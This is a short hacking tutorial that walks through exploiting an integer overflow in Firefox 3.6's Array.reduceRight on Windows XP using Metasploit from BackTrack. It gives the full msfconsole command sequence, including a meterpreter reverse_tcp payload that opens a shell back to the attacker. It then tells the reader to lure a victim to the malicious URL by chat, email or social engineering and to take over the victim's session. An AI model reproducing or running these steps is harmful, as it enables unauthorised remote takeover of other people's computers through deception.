Exploit Remote Windows PC using Mozilla Firefox Array.reduceRight () Integer Overflow

This module exploits a vulnerability found in Mozilla Firefox 3.6. When an array object is configured with a large length value, the reduceRight() method may cause an invalid index being used, allowing abitrary remote code execution. Please note that the exploit requires a longer amount of time (compare to a typical browser exploit) in order to gain control of the machine
Mozilla Firefox 3.6.16
Windows XP SP 2
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/browser/mozilla_reduceright 
Msf exploit (mozilla_reduceright)>set payload windows/meterpreter/reverse_tcp
Msf exploit (mozilla_reduceright)>set lhost 192.168.1.4 (IP of Local Host)
Msf exploit (mozilla_reduceright)>set srvhost 192.168.1.4 (This must be an address on the local machine)
Msf exploit (mozilla_reduceright)>set uripath mozillanews (The Url to use for this exploit)
Msf exploit (mozilla_reduceright)>exploit

Now an URL you should give to your victim http://192.168.1.4:8080/mozillanews

Send the link of the server to the victim via chat or email or any social engineering technique.
Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
